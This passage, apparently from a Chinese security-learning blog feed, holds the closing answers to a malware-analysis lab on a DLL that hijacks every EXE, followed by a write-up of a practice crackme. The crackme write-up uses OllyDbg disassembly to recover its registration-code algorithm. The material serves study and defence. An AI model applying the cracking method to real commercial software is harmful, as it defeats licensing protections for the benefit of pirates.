src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-19.png"></p><h3 id="1-这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行？"><a href="#1-这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行？" class="headerlink" title="1.这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行？"></a>1.这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行？</h3><p>在计算机中的每个EXE中都植入了一个DLL，相当于一个后门。</p><h3 id="2-这个恶意代码的两个明显的基于主机的特征是什么？"><a href="#2-这个恶意代码的两个明显的基于主机的特征是什么？" class="headerlink" title="2.这个恶意代码的两个明显的基于主机的特征是什么？"></a>2.这个恶意代码的两个明显的基于主机的特征是什么？</h3><p>一个是互斥量SADFHUHF，另一个是在C:\Windows\System32\文件夹下的kerne132.dll。</p><h3 id="3-这个程序的目的是什么？"><a href="#3-这个程序的目的是什么？" class="headerlink" title="3.这个程序的目的是什么？"></a>3.这个程序的目的是什么？</h3><p>搜索所有的EXE文件，并且让它们加载恶意的DLL文件kerne132.dll，这个DLL文件会进行一个SOCKET通信来执行操作，一个操作是sleep，另一个操作是会执行发送过来的进程，可能是恶意进程。</p><h3 id="4-一旦这个恶意代码被安装，你如何移除它？"><a href="#4-一旦这个恶意代码被安装，你如何移除它？" class="headerlink" title="4.一旦这个恶意代码被安装，你如何移除它？"></a>4.一旦这个恶意代码被安装，你如何移除它？</h3><p>如果安装，当前的exe文件都会加载这个恶意的DLL，可以写一个程序遍历所有的exe并且搜索其中的kerne132.dll，然后再用kernel.32替换它，或者复制kernel32.dll为kerne132.dll进行替换。</p>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>160CrackMe-011</title>
    <link href="/2021/08/16/160CrackMe-011/"/>
    <url>/2021/08/16/160CrackMe-011/</url>
    
    <content type="html"><![CDATA[<h2 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h2><p>打开程序看到主界面，不可以输入任何字符，只可以点击下面的这个小键盘来进行输入，右边提示一个状态上面写着未注册，猜测成功的话这里应该会发生变化，下面开始分析一下。</p><p><img src="/2021/08/16/160CrackMe-011/1.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>无壳，使用VB语言编写</p><p><img src="/2021/08/16/160CrackMe-011/2.png"></p><p>使用OD，直接搜索字符串，就可以搜索到一大串类似注册码的字符串和REGISTRIERT。</p><p><img src="/2021/08/16/160CrackMe-011/3.png"></p><p>进入查看，可以看到在关键跳转前有一个比较，猜测应该是输入的内容经过一个计算之后与这个字符串进行比较。</p><p><img src="/2021/08/16/160CrackMe-011/4.png"></p><p>查看栈，可以看到当前输入123456计算出来的注册码</p><p><img src="/2021/08/16/160CrackMe-011/5.png"></p><p>开始寻找一下注册码的生成过程。</p><p>在跳转前面下断进行分析，可以看到流程是比较简单的，首先就是获取输入的第一位数字转为浮点数保存起来，然后每一位输入转为ascii码加上这个数字，第一位在前面加上一个0。也就是如果我们输入的是123456，那么我们输入的每一位字符都会加上数字1，也就是注册码第一位是0x31+1=0x32，然后是第一位所以要在前面加上一个0,就是032，第二位就是0x32+1=0x33,现在就是03233，以此类推就会生成前面图片中的字符串，0323334353637。</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm">004048EB   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; /Step8 = NULL</span><br>004048EC   .  8D4D 9C       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x64</span>]          <span class="hljs-comment">; |</span><br>004048EF   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |/var18 = 005446A4</span><br>004048F0   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; ||retBuffer8 = 00530000</span><br>004048F1   .  89B5 4CFFFFFF <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xB4</span>],<span class="hljs-built_in">esi</span>          <span class="hljs-comment">; ||msvbvm60.__vbaStrVarVal</span><br>004048F7   .  89B5 3CFFFFFF <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xC4</span>],<span class="hljs-built_in">esi</span>          <span class="hljs-comment">; ||msvbvm60.__vbaStrVarVal</span><br>004048FD   .  FF15 <span class="hljs-number">30104000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaLenVa&gt;<span class="hljs-comment">; |\__vbaLenVar</span><br><span class="hljs-number">00404903</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |End8 = 005446A4</span><br><span class="hljs-number">00404904</span>   .  8D95 3CFFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xC4</span>]          <span class="hljs-comment">; |</span><br>0040490A   .  8D85 08FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xF8</span>]          <span class="hljs-comment">; |</span><br><span class="hljs-number">00404910</span>   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; |Start8 = NULL</span><br><span class="hljs-number">00404911</span>   .  8D8D 18FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xE8</span>]          <span class="hljs-comment">; |</span><br><span class="hljs-number">00404917</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |TMPend8 = 005446A4</span><br><span class="hljs-number">00404918</span>   .  8D55 DC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x24</span>]          <span class="hljs-comment">; |</span><br>0040491B   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; |TMPstep8 = 00530000</span><br>0040491C   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; |Counter8 = NULL</span><br><span class="hljs-number">0040491D</span>   .  FF15 <span class="hljs-number">38104000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaVarFo&gt;<span class="hljs-comment">; \__vbaVarForInit</span><br><span class="hljs-number">00404923</span>   .  8B35 <span class="hljs-number">80104000</span> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">esi</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaSt&gt;<span class="hljs-comment">;  msvbvm60.__vbaStrVarVal</span><br><span class="hljs-number">00404929</span>   .  8B1D B4104000 <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60.#<span class="hljs-number">617</span>&gt;]  <span class="hljs-comment">;  msvbvm60.rtcLeftCharVar</span><br>0040492F   &gt;  85C0          <span class="hljs-keyword">test</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br><span class="hljs-number">00404931</span>   .  0F84 <span class="hljs-number">29010000</span> <span class="hljs-keyword">je</span> Andréna<span class="hljs-number">.</span>00404A60<br><span class="hljs-number">00404937</span>   .  8D45 BC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x44</span>]<br>0040493A   .  6A <span class="hljs-number">01</span>         <span class="hljs-keyword">push</span> <span class="hljs-number">0x1</span><br>0040493C   .  8D4D 8C       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x74</span>]<br>0040493F   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br><span class="hljs-number">00404940</span>   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br><span class="hljs-number">00404941</span>   .  FFD3          <span class="hljs-keyword">call</span> <span class="hljs-built_in">ebx</span>                                 <span class="hljs-comment">;  msvbvm60.rtcLeftCharVar</span><br><span class="hljs-number">00404943</span>   .  8D55 8C       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x74</span>]<br><span class="hljs-number">00404946</span>   .  8D45 B0       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x50</span>]<br><span class="hljs-number">00404949</span>   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br>0040494A   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>0040494B   .  FFD6          <span class="hljs-keyword">call</span> <span class="hljs-built_in">esi</span>                                 <span class="hljs-comment">;  msvbvm60.__vbaStrVarVal</span><br><span class="hljs-number">0040494D</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>0040494E   .  FF15 D8104000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60.#<span class="hljs-number">581</span>&gt;]     <span class="hljs-comment">;  获取第一位数字转为浮点数以便后面计算</span><br><span class="hljs-number">00404954</span>   .  DD9D 34FFFFFF <span class="hljs-keyword">fstp</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xCC</span>]<br>0040495A   .  8D4D 9C       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x64</span>]<br><span class="hljs-number">0040495D</span>   .  8D55 DC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x24</span>]<br><span class="hljs-number">00404960</span>   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br><span class="hljs-number">00404961</span>   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br><span class="hljs-number">00404962</span>   .  C745 A4 <span class="hljs-number">01000</span>&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x5C</span>],<span class="hljs-number">0x1</span><br><span class="hljs-number">00404969</span>   .  C745 9C <span class="hljs-number">02000</span>&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x64</span>],<span class="hljs-number">0x2</span><br><span class="hljs-number">00404970</span>   .  FF15 AC104000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaI4Var&gt;<span class="hljs-comment">;  msvbvm60.__vbaI4Var</span><br><span class="hljs-number">00404976</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br><span class="hljs-number">00404977</span>   .  8D45 BC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x44</span>]<br>0040497A   .  8D4D B8       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x48</span>]<br><span class="hljs-number">0040497D</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>0040497E   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br>0040497F   .  FFD6          <span class="hljs-keyword">call</span> <span class="hljs-built_in">esi</span>                                 <span class="hljs-comment">;  msvbvm60.__vbaStrVarVal</span><br><span class="hljs-number">00404981</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br><span class="hljs-number">00404982</span>   .  FF15 4C104000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60.#<span class="hljs-number">631</span>&gt;]     <span class="hljs-comment">;  msvbvm60.rtcMidCharBstr</span><br><span class="hljs-number">00404988</span>   .  8BD0          <span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">eax</span><br>0040498A   .  8D4D B4       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4C</span>]<br><span class="hljs-number">0040498D</span>   .  FF15 BC104000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaStrMo&gt;<span class="hljs-comment">;  msvbvm60.__vbaStrMove</span><br><span class="hljs-number">00404993</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; /String = &quot;7&quot;</span><br><span class="hljs-number">00404994</span>   .  FF15 <span class="hljs-number">20104000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60.#<span class="hljs-number">516</span>&gt;]     <span class="hljs-comment">; \转为ascii</span><br>0040499A   .  0FBFD0        <span class="hljs-keyword">movsx</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-number">0040499D</span>   .  <span class="hljs-number">8995</span> FCFCFFFF <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x304</span>],<span class="hljs-built_in">edx</span><br>004049A3   .  C785 7CFFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x84</span>],<span class="hljs-number">0x5</span><br>004049AD   .  DB85 FCFCFFFF <span class="hljs-keyword">fild</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x304</span>]<br>004049B3   .  DD9D F4FCFFFF <span class="hljs-keyword">fstp</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x30C</span>]<br>004049B9   .  DD85 F4FCFFFF <span class="hljs-keyword">fld</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x30C</span>]<br>004049BF   .  DC85 34FFFFFF <span class="hljs-keyword">fadd</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xCC</span>]             <span class="hljs-comment">;  每一位字符ascii码加上第一位数字</span><br>004049C5   .  DD5D <span class="hljs-number">84</span>       <span class="hljs-keyword">fstp</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x7C</span>]<br>004049C8   .  DFE0          <span class="hljs-keyword">fstsw</span> <span class="hljs-built_in">ax</span><br>004049CA   .  A8 <span class="hljs-number">0D</span>         <span class="hljs-keyword">test</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">0xD</span><br>004049CC   .  0F85 FA1F0000 <span class="hljs-keyword">jnz</span> Andréna<span class="hljs-number">.</span>004069CC<br>004049D2   .  8D85 7CFFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x84</span>]<br>004049D8   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>004049D9   .  FF15 <span class="hljs-number">94104000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60.#<span class="hljs-number">572</span>&gt;]     <span class="hljs-comment">;  msvbvm60.rtcHexBstrFromVar</span><br>004049DF   .  8D4D CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>004049E2   .  <span class="hljs-number">8985</span> 74FFFFFF <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8C</span>],<span class="hljs-built_in">eax</span><br>004049E8   .  8D95 6CFFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x94</span>]<br>004049EE   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br>004049EF   .  8D85 5CFFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xA4</span>]<br>004049F5   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br>004049F6   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>004049F7   .  C785 6CFFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x94</span>],<span class="hljs-number">0x8</span><br>00404A01   .  FF15 <span class="hljs-number">84104000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaVarCa&gt;<span class="hljs-comment">;  msvbvm60.__vbaVarCat</span><br>00404A07   .  8BD0          <span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">eax</span><br>00404A09   .  8D4D CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>00404A0C   .  FFD7          <span class="hljs-keyword">call</span> <span class="hljs-built_in">edi</span>                                 <span class="hljs-comment">;  msvbvm60.__vbaVarMove</span><br>00404A0E   .  8D4D B0       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x50</span>]<br>00404A11   .  8D55 B4       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4C</span>]<br>00404A14   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br>00404A15   .  8D45 B8       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x48</span>]<br>00404A18   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br>00404A19   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>00404A1A   .  6A <span class="hljs-number">03</span>         <span class="hljs-keyword">push</span> <span class="hljs-number">0x3</span><br>00404A1C   .  FF15 9C104000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaFreeS&gt;<span class="hljs-comment">;  msvbvm60.__vbaFreeStrList</span><br>00404A22   .  8D8D 6CFFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x94</span>]<br>00404A28   .  8D95 7CFFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x84</span>]<br>00404A2E   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br>00404A2F   .  8D45 8C       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x74</span>]<br>00404<span class="hljs-built_in">A32</span>   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br>00404A33   .  8D4D 9C       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x64</span>]<br>00404A36   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>00404A37   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br>00404A38   .  6A <span class="hljs-number">04</span>         <span class="hljs-keyword">push</span> <span class="hljs-number">0x4</span><br>00404A3A   .  FF15 <span class="hljs-number">14104000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaFreeV&gt;<span class="hljs-comment">;  msvbvm60.__vbaFreeVarList</span><br>00404A40   .  83C4 <span class="hljs-number">24</span>       <span class="hljs-keyword">add</span> <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x24</span><br>00404A43   .  8D95 08FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xF8</span>]<br>00404A49   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span 